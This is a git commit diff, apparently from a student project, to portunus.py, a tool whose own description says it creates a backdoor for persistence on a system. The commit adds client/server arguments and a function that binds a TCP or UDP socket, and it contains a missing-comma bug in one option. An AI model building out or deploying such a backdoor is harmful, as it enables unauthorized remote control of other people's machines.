ac2d0c6ef19a5275d0d6148379acea1068c47471
Maxwell <msf9542@g.rit.edu>
2020-05-15 14:39:32 -0400

    udp and tcp connection socket creation for host

--- portunus.py
+++ portunus.py
@@ -1,14 +1,20 @@
 import argparse
 import os
 import getpass
+import socket
 
 
 def parse_args():
     parser = argparse.ArgumentParser(
         description="creates a backdoor to install on a system to gain persistence")
+    client_server = parser.add_mutually_exclusive_group()
+    client_server.add_argument(
+        '-s', '--server', help='establishes current connection as where hosts will connect to')
+    client_server.add_argument(
+        '-h' '--host', help='establishes current connextion as host issuing commends to the server')
     port = parser.add_mutually_exclusive_group()
     port.add_argument(
-        '-p', '--port', help='defines static connection port', type=int)
+        '-p', '--port', help='defines static connection port', type=int, nargs=1)
     port_randomization = port.add_argument_group()
     port_randomization.add_argument(
         '-r', '--range', help='defines range of ports to randomize connection over', nargs=2)
@@ -38,6 +44,25 @@ def run_shell():
                     pass
         except:
             print("failure executing command")
+
+
+def host_connections(ip, port, tcp):
+    print('[+] creating socket')
+    try:
+        host = socket.socket(
+            socket.AF_INET, socket.SOCK_STREAM if tcp else socket.SOCK_DGRAM)
+    except:
+        print('[+] socket failed to be created')
+        return False
+    print('[+] socket successfully created')
+    print(f'[+] binding socket to {ip}:{port}')
+    try:
+        host.bind((ip, port))
+    except:
+        print(f'[+] socket failed to bind to {ip}:{port}')
+        return False
+    print(f'[+] socket successfully bound to {ip}:{port}')
+    return(host)
 
 
 def main():
